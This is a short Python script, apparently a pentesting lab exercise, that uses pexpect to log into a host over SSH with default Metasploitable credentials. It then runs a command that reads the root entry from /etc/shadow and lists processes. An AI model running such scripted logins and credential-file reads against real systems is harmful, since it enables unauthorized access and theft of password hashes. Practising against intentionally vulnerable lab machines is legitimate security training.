#!/usr/bin/python3
""" """
import pexpect

PROMPT = ['#', '>>>', '> ', '\$']

def send_cmd(conn, cmd):
    conn.sendline(cmd)
    conn.expect(PROMPT)
    print(conn.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    conn_str = 'ssh {}@{}'.format(user, host)
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword:' ])
    if ret == 0:
        print('[-] Error connecting')
    if ret ==1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error connecting')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child
        
def main():
    host = '192.168.1.79'
    user = 'msfadmin'
    password = 'msfadmin'

    child = connect(user, host, password)

    send_cmd(child, 'cat /etc/shadow | grep root;ps')

if __name__ == '__main__':
    main()
